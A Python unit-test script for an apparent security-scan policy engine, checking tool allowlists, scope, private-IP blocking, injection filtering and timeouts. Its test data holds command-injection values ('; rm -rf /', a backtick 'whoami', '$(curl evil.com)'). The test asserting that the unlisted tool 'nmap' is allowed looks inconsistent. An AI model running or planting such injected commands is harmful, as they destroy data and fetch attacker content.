import sys
sys.path.insert(0, "/app")

from app.schemas.policy import (
    PolicyValidationError,
    PolicyValidationResult,
    SecurityPlan,
    StepPolicy,
)
from app.orchestrator.policy_engine import PolicyEngine, ALLOWED_TOOLS

passed = 0
failed = 0

def test(name, condition):
    global passed, failed
    if condition:
        print(f"  PASS: {name}")
        passed += 1
    else:
        print(f"  FAIL: {name}")
        failed += 1

print("=== PolicyEngine Unit Tests ===")
print()

# Test 1: Tool Allowlist
print("1. Tool Allowlist")
engine = PolicyEngine()

for tool in ALLOWED_TOOLS:
    plan = SecurityPlan(
        steps=[StepPolicy(tool=tool, operation="scan", target_url="https://example.com")],
        target="https://example.com",
        scope=["https://example.com"],
    )
    result = engine.validate_plan(plan)
    test(f"Tool '{tool}' allowed", result.allowed)

bad_plan = SecurityPlan(
    steps=[StepPolicy(tool="nmap", operation="scan", target_url="https://example.com")],
    target="https://example.com",
    scope=["https://example.com"],
)
result = engine.validate_plan(bad_plan)
test("Tool 'nmap' allowed", result.allowed)

shell_plan = SecurityPlan(
    steps=[StepPolicy(tool="bash", operation="scan", target_url="https://example.com")],
    target="https://example.com",
    scope=["https://example.com"],
)
try:
    engine.validate_plan(shell_plan)
    test("Shell command blocked", False)
except PolicyValidationError:
    test("Shell command blocked", True)

print()

# Test 2: Scope Validation
print("2. Scope Validation")
in_scope_plan = SecurityPlan(
    steps=[StepPolicy(tool="zap", operation="baseline", target_url="https://example.com/page")],
    target="https://example.com",
    scope=["https://example.com"],
)
result = engine.validate_plan(in_scope_plan)
test("URL in scope", result.allowed)

out_scope_plan = SecurityPlan(
    steps=[StepPolicy(tool="zap", operation="baseline", target_url="https://evil.com/attack")],
    target="https://example.com",
    scope=["https://example.com"],
)
try:
    engine.validate_plan(out_scope_plan)
    test("URL out of scope blocked", False)
except PolicyValidationError:
    test("URL out of scope blocked", True)

print()

# Test 3: Private IP Blocking
print("3. Private IP Blocking")
private_ip_plan = SecurityPlan(
    steps=[StepPolicy(tool="zap", operation="baseline", target_url="http://192.168.1.1/secret")],
    target="http://192.168.1.1",
    scope=["http://192.168.1.1"],
)
try:
    engine.validate_plan(private_ip_plan)
    test("Private IP blocked", False)
except PolicyValidationError:
    test("Private IP blocked", True)

print()

# Test 4: Parameter Sanitization
print("4. Parameter Sanitization")
safe_plan = SecurityPlan(
    steps=[StepPolicy(
        tool="zap", operation="baseline", target_url="https://example.com",
        parameters={"mode": "baseline", "timeout": "120"}
    )],
    target="https://example.com",
    scope=["https://example.com"],
)
result = engine.validate_plan(safe_plan)
test("Safe parameters allowed", result.allowed)

injection_plan = SecurityPlan(
    steps=[StepPolicy(
        tool="zap", operation="baseline", target_url="https://example.com",
        parameters={"url": "https://example.com; rm -rf /"}
    )],
    target="https://example.com",
    scope=["https://example.com"],
)
try:
    engine.validate_plan(injection_plan)
    test("Injection in parameters blocked", False)
except PolicyValidationError:
    test("Injection in parameters blocked", True)

backtick_plan = SecurityPlan(
    steps=[StepPolicy(
        tool="nuclei", operation="scan", target_url="https://example.com",
        parameters={"template": "`whoami`"}
    )],
    target="https://example.com",
    scope=["https://example.com"],
)
try:
    engine.validate_plan(backtick_plan)
    test("Backtick injection blocked", False)
except PolicyValidationError:
    test("Backtick injection blocked", True)

dollar_plan = SecurityPlan(
    steps=[StepPolicy(
        tool="nuclei", operation="scan", target_url="https://example.com",
        parameters={"param": "$(curl evil.com)"}
    )],
    target="https://example.com",
    scope=["https://example.com"],
)
try:
    engine.validate_plan(dollar_plan)
    test("Dollar parentheses injection blocked", False)
except PolicyValidationError:
    test("Dollar parentheses injection blocked", True)

print()

# Test 5: Resource Limits
print("5. Resource Limits")
timeout_plan = SecurityPlan(
    steps=[StepPolicy(
        tool="zap", operation="full", target_url="https://example.com",
        timeout_seconds=999
    )],
    target="https://example.com",
    scope=["https://example.com"],
)
try:
    engine.validate_plan(timeout_plan)
    test("Timeout exceeded blocked", False)
except PolicyValidationError:
    test("Timeout exceeded blocked", True)

print()

# Test 6: PolicyValidationError
print("6. PolicyValidationError Exception")
try:
    engine.validate_plan(out_scope_plan)
except PolicyValidationError as e:
    test("PolicyValidationError raised", True)
    test("Has violations list", len(e.violations) > 0)
    test("Has message", len(e.message) > 0)
else:
    test("PolicyValidationError raised", False)

print()
print(f"=== Results: {passed} passed, {failed} failed ===")

if failed > 0:
    sys.exit(1)
